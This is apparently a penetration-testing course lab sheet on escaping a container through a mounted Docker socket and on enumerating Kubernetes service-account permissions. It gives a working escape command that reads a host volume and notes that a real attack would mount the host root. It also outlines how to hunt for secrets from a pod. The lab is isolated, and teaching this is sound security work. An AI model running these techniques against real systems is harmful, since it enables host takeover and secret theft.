# Lab 13 — Containers (Docker socket escape) &amp; Kubernetes

**Module:** 13. **Time:** ~90 min. **Hardware:** any Docker host. **Target:** a container
(`ptlab13_target`) with the **Docker socket mounted** — a deliberate, high-impact misconfiguration
— on an internal (no-egress) network. **Objective:** use the socket to drive the host daemon and
read data the container should not reach.

<div class="callout legal">

LAB TARGET ONLY. The "host data" the escape reaches is a benign named volume seeded with a
`LAB-FLAG` marker — deterministic and off your real host root. In the real world the same socket
lets an attacker mount the actual host filesystem. Verify no Internet egress with `./labs/lab check`
(the socket mount is the vector under study; network egress stays blocked).

</div>

## Run

```bash
./labs/lab up   lab-13-containers
./labs/lab check
docker exec -it ptlab13_target sh        # your shell in the "compromised app"
#   inside:  ls -la /var/run/docker.sock
py labs/lab-13-containers/verify.py      # acceptance test (lab health, not a solution)
./labs/lab down lab-13-containers
```

## The escape (mechanism)

The socket is the root daemon's API. From inside the container you can ask the daemon to start a
new container that mounts something you shouldn't reach — here, the seeded `ptlab13_hostdata`
volume (a real engagement would mount `/`):

```bash
docker -H unix:///var/run/docker.sock run --rm -v ptlab13_hostdata:/h alpine cat /h/flag.txt
```

Why it works: the daemon runs as root on the host; you asked it (via the mounted socket) to mount
a volume into a new container and it obliged. See [lesson 13.1](../../lessons/module-13/lesson-01.md).

## Kubernetes portion (13.2)

Stand up a local throwaway cluster with `kind` (or `minikube`) — see
[lesson 13.2](../../lessons/module-13/lesson-02.md) and `labs/vm`/`TOOLS.md`. From a pod, enumerate
the service-account token and `kubectl auth can-i --list`, then find a path to secrets or a
host-mounting pod. (Kept as a guided on-demand cluster rather than a always-on service to stay
light; the lesson drives it.)

## Reset

`./labs/lab reset lab-13-containers` recreates the container and re-seeds the marker volume.
